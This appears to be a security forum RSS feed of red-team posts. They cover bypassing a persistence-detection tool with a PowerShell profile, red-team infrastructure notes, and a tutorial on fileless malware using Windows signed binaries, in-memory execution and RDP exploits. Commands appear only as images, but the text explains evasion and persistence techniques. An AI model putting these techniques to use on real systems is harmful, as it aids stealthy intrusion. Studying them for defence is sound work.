<p>Let’s begin the tools explains what techniques are implemented and are detected by this, since this is one guy and open source. Don’t expect that this is a one in all solution, if we remember in “The Why” section it’s explained that it was suited for the developer but made the effort to make a friendly for everyone. There are currently 34 techniques that are implemented.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/0/c069975cb496fe846033ab2a45eca189374865e1.png" data-download-href="/uploads/short-url/rs9TXpQvYoQnTeCyZWEXtteNjgZ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/0/c069975cb496fe846033ab2a45eca189374865e1_2_397x500.png" alt="" data-base62-sha1="rs9TXpQvYoQnTeCyZWEXtteNjgZ" width="397" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/0/c069975cb496fe846033ab2a45eca189374865e1_2_397x500.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/0/c069975cb496fe846033ab2a45eca189374865e1_2_595x750.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/0/c069975cb496fe846033ab2a45eca189374865e1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/0/c069975cb496fe846033ab2a45eca189374865e1_2_10x10.png"></a></div><p></p>
<p>Let’s run the tool on a clean box and take a look at what the tool see’s.</p>
<p>This shows some false positives these alerts do exist but aren’t malicious. Now let’s add a malicious persistence.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/5/3/53598f40545eb382883d01ba73fd6160c07dcc2e.png" data-download-href="/uploads/short-url/bTlvEyXeN2Ofz1q8NxqWwlnwVem.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/5/3/53598f40545eb382883d01ba73fd6160c07dcc2e_2_690x322.png" alt="" data-base62-sha1="bTlvEyXeN2Ofz1q8NxqWwlnwVem" width="690" height="322" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/5/3/53598f40545eb382883d01ba73fd6160c07dcc2e_2_690x322.png, https://0x00sec.s3.amazonaws.com/optimized/3X/5/3/53598f40545eb382883d01ba73fd6160c07dcc2e_2_1035x483.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/5/3/53598f40545eb382883d01ba73fd6160c07dcc2e_2_1380x644.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/5/3/53598f40545eb382883d01ba73fd6160c07dcc2e_2_10x10.png"></a></div><p></p>
<p>Take a look at the new output showing us the Persistence Technique being utilized here.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/2/7237b8248e92bec44ceed7eae898ba81958067d1.png" data-download-href="/uploads/short-url/gipOctC4uLdCluhPjnXPmlSC1pL.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/2/7237b8248e92bec44ceed7eae898ba81958067d1_2_690x299.png" alt="" data-base62-sha1="gipOctC4uLdCluhPjnXPmlSC1pL" width="690" height="299" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/2/7237b8248e92bec44ceed7eae898ba81958067d1_2_690x299.png, https://0x00sec.s3.amazonaws.com/optimized/3X/7/2/7237b8248e92bec44ceed7eae898ba81958067d1_2_1035x448.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/7/2/7237b8248e92bec44ceed7eae898ba81958067d1_2_1380x598.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/7/2/7237b8248e92bec44ceed7eae898ba81958067d1_2_10x10.png"></a></div><p></p>
<p>The data shown is great for an analyst. We can take a look at some valuable information about the technique, it will give us the Name, the Classification with MITRE, the Path of where it’s located and if it has a Signature.</p>
<p>Let’s take a look at the code here, these are the parameters which we can use to search for 1 specific or all techniques there is a technique that isn’t here which we will apply next, and those are PowerShell Profiles.</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/b/9bab2b96d69ddb3a4c36e25b9057caa33415b804.png" data-download-href="/uploads/short-url/md6JMUYtieKWKJz80elx04KeTE8.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/b/9bab2b96d69ddb3a4c36e25b9057caa33415b804.png" alt="" data-base62-sha1="md6JMUYtieKWKJz80elx04KeTE8" width="362" height="500" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/b/9bab2b96d69ddb3a4c36e25b9057caa33415b804_2_10x10.png"></a></div><p></p>
<blockquote>
<p>I see something about Terminal Profiles no clue what that is, but hey I learned something.</p>
</blockquote>
<p>This is why it’s good to understand the Blue Team the tools they use, the procedures they take and the stuff they know and look for.</p>
<p>Applying a PowerShell profile persistence technique the tool doesn’t catch it</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/6/4/64d9627ecefa79d5031d62ad52abcfeee9f9116b.png" data-download-href="/uploads/short-url/eo9uuaf0V0S5bzMtgseVrPtX1LJ.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/6/4/64d9627ecefa79d5031d62ad52abcfeee9f9116b_2_690x344.png" alt="" data-base62-sha1="eo9uuaf0V0S5bzMtgseVrPtX1LJ" width="690" height="344" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/6/4/64d9627ecefa79d5031d62ad52abcfeee9f9116b_2_690x344.png, https://0x00sec.s3.amazonaws.com/optimized/3X/6/4/64d9627ecefa79d5031d62ad52abcfeee9f9116b_2_1035x516.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/6/4/64d9627ecefa79d5031d62ad52abcfeee9f9116b_2_1380x688.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/6/4/64d9627ecefa79d5031d62ad52abcfeee9f9116b_2_10x10.png"></a></div><p></p>
<p>Now every time a user loads PowerShell our payload will get executed</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/d/f/dfb229cd75727fb232b4cd8464ee60bc459d193c.png" data-download-href="/uploads/short-url/vUUbIwiT0TMYNisMsfqDgsfHzFG.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb229cd75727fb232b4cd8464ee60bc459d193c_2_690x329.png" alt="" data-base62-sha1="vUUbIwiT0TMYNisMsfqDgsfHzFG" width="690" height="329" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb229cd75727fb232b4cd8464ee60bc459d193c_2_690x329.png, https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb229cd75727fb232b4cd8464ee60bc459d193c_2_1035x493.png 1.5x, https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb229cd75727fb232b4cd8464ee60bc459d193c_2_1380x658.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/d/f/dfb229cd75727fb232b4cd8464ee60bc459d193c_2_10x10.png"></a></div><p></p>
<p>I wanted to give in understanding on why we need to understand our tools, and be in Zen with the Blue Team. We aren’t here to argue and complain about each other, were mostly here to help each other and understand both the Offensive and Defensive side of Cyber Security. Even though it’s not always that way it’s still good practice for anyone trying to understand why our tools get caught.</p>
<pre><code class="lang-auto">What better way to bypass protections if you don't understand how they work???. 
</code></pre>
<pre><code class="lang-auto">How can you protect if you never get a challenge not everyone uses metasploit.
</code></pre>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://dmcxblue.net/2022/11/10/playing-blue/">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/b/4/b47c0e95be15f3c3797462e923bddefcbdb72c55.jpeg" class="site-icon" width="32" height="32">

      <a href="https://dmcxblue.net/2022/11/10/playing-blue/" target="_blank" rel="noopener nofollow ugc" title="01:39PM - 10 November 2022">DMCXBLUE – 10 Nov 22</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:439/210;"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/3/236883536927d593a1f29bc5278bde362dd61992.png" class="thumbnail" width="439" height="210"></div>

<h3><a href="https://dmcxblue.net/2022/11/10/playing-blue/" target="_blank" rel="noopener nofollow ugc">Playing Blue</a></h3>

  <p>Yes, Red Team is sexy, I’m a Red Teamer and it’s the Hype!!. Who doesn’t like the rush of being a bad guy and hacking into a Network Infrastructure while trying to be as OPSEC on …</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/playing-on-the-blue-side/32076">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/playing-on-the-blue-side/32076</link>
          <pubDate>Thu, 10 Nov 2022 13:42:01 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-32076</guid>
          <source url="https://0x00sec.org/t/playing-on-the-blue-side/32076.rss">Playing on the Blue Side</source>
        </item>
        <item>
          <title>Red Team Infrastructure</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <p>Hi everyone!!</p>
<p>Been a little quiet for a while, but I’ve been grinding on this Red Team stuff, recently got an amazing certificate from HackTheBox on Red Team, and of course working on more! I haven’t forgotten about our beginner security engineers trying to jump on red teaming, so I’ve built the RedTeamNotes 2.0 for everyone to see, and understand how the red team techniques work at a very high level but now, what about setting up infrastructure from 0 to hero. Well I’ve taken care of that, and of course, all the tools utilized are open source as always, and do have fun learning and practicing. Don’t be afraid to reach out, maybe I misspelled or got something wrong.</p>
<p>I will be updating the book more, more techniques, tips, and tricks.</p>
<p>Please enjoy!</p>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-infrastructure/red-team-infrastructure">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/3X/e/4/e428734c7d42a016c58e18f378f3f44c72a3b359.png" class="site-icon" width="64" height="64">

      <a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-infrastructure/red-team-infrastructure" target="_blank" rel="noopener nofollow ugc">dmcxblue.gitbook.io</a>
  </header>

  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/362;"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/10c292fe5f13baae37cdc68aac7e5428772b69c7_2_690x362.png" class="thumbnail" width="690" height="362" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/10c292fe5f13baae37cdc68aac7e5428772b69c7_2_690x362.png, https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/10c292fe5f13baae37cdc68aac7e5428772b69c7_2_1035x543.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/1/0/10c292fe5f13baae37cdc68aac7e5428772b69c7.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/1/0/10c292fe5f13baae37cdc68aac7e5428772b69c7_2_10x10.png"></div>

<h3><a href="https://dmcxblue.gitbook.io/red-team-notes-2-0/red-team-infrastructure/red-team-infrastructure" target="_blank" rel="noopener nofollow ugc">RED TEAM INFRASTRUCTURE</a></h3>



  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

            <p><small>4 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/red-team-infrastructure/29056">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/red-team-infrastructure/29056</link>
          <pubDate>Mon, 18 Apr 2022 01:14:17 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-29056</guid>
          <source url="https://0x00sec.org/t/red-team-infrastructure/29056.rss">Red Team Infrastructure</source>
        </item>
        <item>
          <title>Fileless Malware</title>
          <dc:creator><![CDATA[dmcxblue]]></dc:creator>
          <category>Red-Team</category>
          <description><![CDATA[
            <h1><a name="fileless-malware-1" class="anchor" href="https://0x00sec.org#fileless-malware-1"></a>Fileless Malware</h1>
<h2><a name="turning-ourselves-into-ghosts-2" class="anchor" href="https://0x00sec.org#turning-ourselves-into-ghosts-2"></a>Turning ourselves into Ghosts</h2>
<p>“ <em><strong>Hunting for a fileless threat can be a tedious and labor-intensive task for any analyst. It is, most often than not, extremely time-consuming and requires a significant amount of data gathering. On top of that, the traditional tools, methods, and defenses seem to be less effective when dealing with these almost invisible threats. Threat actors are frequently using attack techniques that work directly from the memory or using legitimate tools or services pre-installed in the system to achieve their goals (Trend Micro, 2017). It is a popular technique among targeted attacks and advanced persistent threats (APT), and now it has been adopted by conventional malware such as Trojans, ransomwares, and even the most recent emerging threat – cryptocurrency miners. In some incidents, searching for a malicious file that resides in the hard drive seem to be insufficient. This study explores the different variations of fileless attacks that targeted the Windows operating system and what kind of artifacts or tools can provide clues for forensic investigations.”</strong></em></p>
<p><strong>Fileless malware</strong></p>
<p>Has been described as an attack that does not entail files being written onto the disk, this is partly true, as we have a few malwares that leave something behind to execute malicious code into memory and then delete itself to leave no traces behind. Its arrival can be through different methods, Exploitation, Brute-Force, USB and typically a phishing email with attachments.</p>
<p>To understand Traditional Malware this is typically done when a Binary or File is downloaded to disk and then executed with traditional malware this file is needed on the host machine to execute its payload. Below you can see the flow of traditional malware.</p>
<p>Traditional Malware</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/4/9/49680a78973609535aa3848958cce9635cd10e81.png" alt="" data-base62-sha1="atnLeVF0Z6S0QmnTn2m2lZafT3z" role="presentation" width="624" height="384"></p>
<p>SANS image</p>
<p><strong>Fileless Malware</strong></p>
<p>The point of entry of Fileless malware is like traditional malware, anything the previous one can do, fileless malware can do as well. Unlike the traditional malware this does not need to store malicious code into a file and save this to disk, it can leverage exploits or launch scripts directly from memory using whitelisted tools (I will touch later this), The image below explains the chain of fileless malware attacks.</p>
<p>Fileless Malware</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/d/1/d1a3c2ea0c38b8acda57d161e13f4a62013b1f08.png" alt="" data-base62-sha1="tUyEcIFDuK6xgUcRcBNPVH1FbUA" role="presentation" width="624" height="319"></p>
<p>SANS image</p>
<p><em><strong>Exploit:</strong></em></p>
<p>The fileless attack that arrives via Exploit may be referred to as “Completely Fileless”. RCE (Remote Code Execution) allows an attacker to load shellcode directly to the memory without writing any files to disk.</p>
<p><em><strong>Malicious Website/MailSpam/Phishing Email:</strong></em></p>
<p>Arrival via malicious websites or phishing emails uses script-based programs such as Macros, PowerShell, VBScript, JavaScript, HTA, etc., to run the malicious code directly to the memory. Typically, the initial script acts as a downloader which connects to a malicious host and downloads the payload. The transition to fileless moves once the script runs in memory and deletes the document upon execution.</p>
<p><em><strong>Persistence</strong></em></p>
<p>The persistence would depend on the end goal of the attacker. Fileless malware may not be persistent at all. Since the malicious code is already running in memory, it can already launch its payload. Without any persistence, a simple reboot would clear the code in memory. WMI or Scheduled Tasks are common fileless persistence method that attackers use.</p>
<p>Some reasons to use Fileless Malware in an Attack</p>
<ul>
<li>Stealthy: Fileless malware uses legitimate tools to proxy execute payloads, sometimes it’s difficult to block these legitimate tools since they are used in an environment regularly</li>
<li>Living-off-the-land: The legitimate tools are installed be default, what more reason do you need.</li>
<li>Trusted: These tools are trusted and sometimes pass unnoticed when executing malware</li>
</ul>
<p><em><strong>Memory Injection</strong></em></p>
<p>Memeory Injection technique involves hiding malicious code in the memory of a legitimate process. While processes that are critical to Windows activity are running, this malware distributes and re-injects itself into these processes, making it trickier to detect as these don’t trigger traditional red flags or whitelists.</p>
<p>Fileless malware exists only in a computer random-access memory (RAM) meaning that nothing is ever written directly to the hard drive. This makes it more difficult to detect as there are no stored files for defensive security software to scan, I will work on some samples that give an idea on how fileless malware can execute and stay living in memory, research from Microsoft categorizes them in 3 types:</p>
<p>In the research it states</p>
<p><strong>Type I: No File Activity Performed</strong></p>
<p>A fully fileless malware can be considered one that never requires writing a file on the disk. How would such malware infect a machine in the first place? One example is where a target machine receives malicious network packets that exploit the EternalBlue vulnerability. The vulnerability allows the installation of the DoublePulsar backdoor, which ends up residing only in the kernel memory. In this case, there is no file, or any data written on a file.</p>
<p>A compromised device may also have malicious code hiding in the device’s firmware (such as BIOS), a USB peripheral (like the BadUSB attack), or in firmware of a network card. All these examples don’t require a file on the disk to run and can theoretically live only in memory. The malicious code would survive reboots, disk re-formats, and OS reinstall.</p>
<p>Infections of this type of cab be particularly difficult to detect because most antivirus products don’t have the capability to inspect firmware. In cases where a product does have the abilities to inspect and detect malicious firmware, these are still significant challenges associated with remediation of threats at this level. This type of fileless malware requires high levels of sophistication and often dangerous, threats of this type are uncommon and not practical for most attacks.</p>
<p><strong>Type II: Indirect file activity</strong></p>
<p>There are other ways that malware can achieve fileless presence on a machine without requiring significant engineering effort. Fileless malware of this type doesn’t directly write files on the file system, but they can end up using files indirectly. For example, with the Poshpy backdoor attackers installed a malicious PowerShell command within the WMI repository and configured a WMI filter to run the command periodically.</p>
<p>It’s possible to carry out such installation via command line without requiring a backdoor to already be on the file. The malware can be installed and theoretically run without ever touching the file system. However, the WMI repository is stored on a physical file in a central storage area managed by the CIM Object Manager, and usually contains legitimate data. Even though the infection chain does technically use a physical file, it’s considered a fileless attack because WMI repository is a multi-purpose data container that can’t be detected and removed.</p>
<p><strong>Type III: Files required to operate</strong></p>
<p>Some malwares can have a sort of fileless persistence, but not without using files to operate. An example for this scenario is Kotver, which creates a shell open verb handler in the registry for a random file extension. Opening the file with such extension will lead to the execution of a script through the legitimate tool mshta.exe</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/6/96b994ab1d27c76708df7529e624b27d1f25c8dc.png" alt="" data-base62-sha1="lvndYFxRGu6wCNz5x0tXoYoTrje" role="presentation" width="624" height="143"></p>
<p>When the open verb is invoked, the associated command from the registry is launched, which results in the execution of a small script. This script reads data form a further registry key and executes it, in turn leading to the loading of the final payload. However, to trigger the open verb in the first place, Kotver has to drop a file with the same extension targeted by the verb (in the example above, the extension is .bbf5590fd). It also must set an auto-run key configured to open such a file when the machine starts.</p>
<p>Kotver is considered a fileless threat because <em><strong>the file system is of no practical use. The files with random extensions contain junk data that isn’t usable in verifying the presence of the threat.</strong></em> The files that store the registry are containers that can’t be detected and deleted if malicious content is present.</p>
<p>Below are some programs and examples of what can be considered fileless malware.</p>
<p>Programs that can achieve Fileless Malware</p>
<ul>
<li>PowerShell.exe</li>
</ul>
<p>PowerShell a powerful language that is built in Windows since Windows 7 it provides access to COM and WMI, it also provides a hosting API with which PowerShell runtime can be embedded inside other applications. An example of a Fileless technique with PowerShell can be the following:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/9/095b986048c7c5ff0b7a2712d71b6227e0f1a8cb.png" alt="" data-base62-sha1="1kMxqfj3RIOhVXH6mEHAPhmYr11" role="presentation" width="624" height="131"></p>
<p>Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/b/bbc2d8bcbd186b45303fdbb20b4f84c1dd76d632.png" alt="" data-base62-sha1="qN0K7KTORDOR1LlQkbPSb2PywBs" role="presentation" width="534" height="240"></p>
<p>No detection and no file left in the workstation since this is directly executed from the Console and the file has no need to be on disk and run.</p>
<ul>
<li>WMIC</li>
</ul>
<p>WMIC provides a command-line interface for Windows Management Instrumentation (WMI). WMIC is compatible with existing shells and utility commands. WMI has the ability to proxy execute XSL files from remote location or to even start processes on its own let’s check some examples.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/7/0791640e23ddd9f21187d88440a1045cae94ac75.png" alt="" data-base62-sha1="14WQ7Mbcha3TiNKEOTQ0G9sBmtv" role="presentation" width="624" height="454"></p>
<ul>
<li>WSCript.exe</li>
</ul>
<p>Windows Scripting Host it provides the ability of scripting comparable to batch files, but with a wider range of supported features. It supports multiple languages such as VBScript (VBE, VBS) and Jscript (JS, JSE) it can also be worked with WHS which is a language independent filename extension. The advantage of this is that it allows multiple scripts (“Jobs”) as well as a combination of scripting languages within a single file.</p>
<p>In the following example will use VBScript, Jscript and Python in the same file and have an execution even though we are combining 3 different Scripting Languages:</p>
<p>For python or any extra languages to be working these need to be install and added to the PATH of the system and registered as a scripting alternative for WSH a great target for this are most likely Developer Workstations in the example we have a file on Disk so this comes into consideration as the script isn’t malicious only the file it calls after which can be PowerShell, Mshta, MSbuild that can execute our payload in-memory</p>
<p>File:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/e/2/e255222831fd2ddfde23f80bbf89bbfdf700b4d3.png" alt="" data-base62-sha1="wieiXFsgG7mq1Rf6w3ZjlMjTvFN" role="presentation" width="408" height="309"></p>
<p>VB:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/b/8b5160a9079cb121eefa104bd761b389f4dd6e8e.png" alt="" data-base62-sha1="jSsIA2a1HZglv6c5UxB1s68wpZA" role="presentation" width="180" height="156"></p>
<p>JS</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/a/0/a0fa10f0a04f07a700ada894cd113132bef60906.png" alt="" data-base62-sha1="mY49ToSV9NjEVpwu8Sa27fdpMP4" role="presentation" width="183" height="150"></p>
<p>Python popping calc</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/7/c776d58eae7e2f90311fc78a123bf826f16162a3.png" data-download-href="/uploads/short-url/ssxCizWgClWyiV77IhZchWmkjrd.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c776d58eae7e2f90311fc78a123bf826f16162a3_2_405x500.png" alt="" data-base62-sha1="ssxCizWgClWyiV77IhZchWmkjrd" role="presentation" width="405" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/7/c776d58eae7e2f90311fc78a123bf826f16162a3_2_405x500.png, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c776d58eae7e2f90311fc78a123bf826f16162a3.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/7/c776d58eae7e2f90311fc78a123bf826f16162a3.png 2x" data-dominant-color="B8D4EB"></a></div><p></p>
<ul>
<li>Cscript.exe</li>
</ul>
<p>Same as WSCript the difference is that this one does give you a CONSOLE window</p>
<ul>
<li>Scriptrunner.exe</li>
</ul>
<p>I couldn’t find much information on what Scriptrunner is, but it seems to be a tool that allows to run multiple scripts instead of building a script that runs multiple things it helps to achieve this all with one line. This allows proxy execution via SMB</p>
<p>Example, there seems to be a warning when executing on remote servers</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/2/02c1faa8ebd73e4a1210d3d24003dc36d5242bac.png" alt="" data-base62-sha1="ooyj0r8uY6lzWz5fVqLDoBN6Hy" role="presentation" width="624" height="326"></p>
<p>But we will ignore it and execute</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/7/b/7bba6b19d9029e1539c094c22be365b019287585.png" data-download-href="/uploads/short-url/hEy7XrhiTv887yOoTUqQjYUzKWp.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7bba6b19d9029e1539c094c22be365b019287585_2_420x500.png" alt="" data-base62-sha1="hEy7XrhiTv887yOoTUqQjYUzKWp" role="presentation" width="420" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/7/b/7bba6b19d9029e1539c094c22be365b019287585_2_420x500.png, https://0x00sec.s3.amazonaws.com/original/3X/7/b/7bba6b19d9029e1539c094c22be365b019287585.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/7/b/7bba6b19d9029e1539c094c22be365b019287585.png 2x" data-dominant-color="A6ADB2"></a></div><p></p>
<ul>
<li>Regsvr32.exe</li>
</ul>
<p>Is a command-line utility for registering and unregistering DLLs and ActiveX controls in the operating systems Registry. It’s a Microsoft signed binary the allows proxy execution (which is the ability to call remote files). This requires elevated permissions</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/2/b256e73dc5ef5bf146d53ea2488ec5d370fd5355.png" data-download-href="/uploads/short-url/prFb6JKI36D3LVLbawGAMQUyMQd.png?dl=1" title="" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/2/b256e73dc5ef5bf146d53ea2488ec5d370fd5355_2_607x500.png" alt="" data-base62-sha1="prFb6JKI36D3LVLbawGAMQUyMQd" role="presentation" width="607" height="500" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/2/b256e73dc5ef5bf146d53ea2488ec5d370fd5355_2_607x500.png, https://0x00sec.s3.amazonaws.com/original/3X/b/2/b256e73dc5ef5bf146d53ea2488ec5d370fd5355.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/2/b256e73dc5ef5bf146d53ea2488ec5d370fd5355.png 2x" data-dominant-color="5F7482"></a></div><p></p>
<ul>
<li>Mshta.exe</li>
</ul>
<p>MSHTA is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same model and technologies of Internet Explorer, but outside the browser, it can run scripting languages such as JScript and VBScript.</p>
<p>Request:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/e/a/ea467764fcd427bcda400129b692af6b1b59571f.png" alt="" data-base62-sha1="xquHv1dv3QlMDO1EW5gjs7bwcj5" role="presentation" width="624" height="274"></p>
<p>Execution:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/f/3/f3ad7d24b45815617e11732af69e912152279094.png" alt="" data-base62-sha1="yLFIQVLE3mjCjscP7vMWgU9aRz6" role="presentation" width="624" height="492"></p>
<p>Let’s not stop with these, we are familiar with Execution via Microsoft Signed Binaries, but we also spoke about exploitation of vulnerabilities as these do not touch Disk, since malicious packets are sent to the target machine and inject our shellcode where necessary, a great example of the recent BlueKeep method which exploits the RDP protocol it’s a major vulnerability affecting primarily Windows 7 machines, other exploits can be EternalBlue.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/d/9d8744cf88e4287fc954e1ca28ec06d9f4c47dc6.png" alt="" data-base62-sha1="mtyM2KNcPUTbdspiSrxEl5Ik7ZA" role="presentation" width="624" height="365"></p>
<p>The need of a file was completely unnecessary, and execution was done remotely.</p>
<p>C#</p>
<p>It gives access to an infrastructure of functions that developers use frequently and can build off. A few C2s have a great feature that allow us to execute C# binaries in memory without the need of placing these binaries on the disk. This is a great Post-Exploitation method to stay in memory.</p>
<p>Example:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/d/bd781f1ffef343339b63d1a8ee3b5db7a3da99ab.png" alt="" data-base62-sha1="r27Bh4UZkOvAoM2GtcGkghMGOCv" role="presentation" width="624" height="265"></p>
<p>I executed the Seatbelt tool to show me the most recent files the user has interacted with, and if we check our current path there is no Binary dropped to Disk.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/e/9e08346802562b45bc2804b6f417c8b6ce046fd5.png" alt="" data-base62-sha1="my11aroKzO0l72dOi39jNarWJ7f" role="presentation" width="444" height="76"></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/3/3/33feb60bf45788da54054d19cf71cb5708aa3c4f.png" alt="" data-base62-sha1="7pY49K0DAIeuUu0fIOboAgO8QHR" role="presentation" width="624" height="225"></p>
<p>After some talk with my Sensei it also came to mind that User Accounts may allow us to stay in memory without touching Disk onto a Targeted Machine some examples may be, PSRemote, RDP, SSH and/or Poor Configuration</p>
<p>PSREMOTE:</p>
<p>The feature from PowerShell to gain a sessionl to execute commands on a remote host.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/2/7246469c79bb25a4c5dd06415f6bb232d314daaf.png" alt="" data-base62-sha1="giUZO3j1fUaOFTAHGTsJv7MjGWP" role="presentation" width="534" height="210"></p>
<p>RDP:</p>
<p>The remote Desktop Protocol which allows users for a fully interactive GUI remotely.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/89c85cb29831f05d26b9002423a7a583ee7090ba.png" alt="" data-base62-sha1="jESGBRZeKJzTRak8ywbVPhC9YDw" role="presentation" width="624" height="339"></p>
<p>Poor Configuration:</p>
<p>When software is installed with poor security implementations a great rule would be such as only allowing specific users access to these features or giving the software sufficient permissions to only execute at a certain level of authority with the possibility of avoiding Administrator or SYSTEM Access. In this Demo what if someone left an Emergency Back-Door to access the system in case they get locked out? Well, this happens:</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/7/2/72cce979865cf52b45aec1e200aba5d010136ed7.png" alt="" data-base62-sha1="gnzs7AYSrome7TbybKSOnAPowUn" role="presentation" width="531" height="411"></p>
<p>PHP Backdoor (Emergency Access)</p>
<p>This technique used there was no file left behind (well by the attacker) this is a legitimate “Emergency” Access that developers left behind for a “just in case”.</p>
<p>With these Demo’s and understanding we have techniques and methods on how to achieve a “Fileless Malware” to execute onto our Target machine and stay hidden. Staying hidden once already in the network and achieving to stay in memory would be already up to the Operator an example would be “Process Injection” is a well-used technique to stay hidden and in memory inside a legitimate Windows Process.</p>
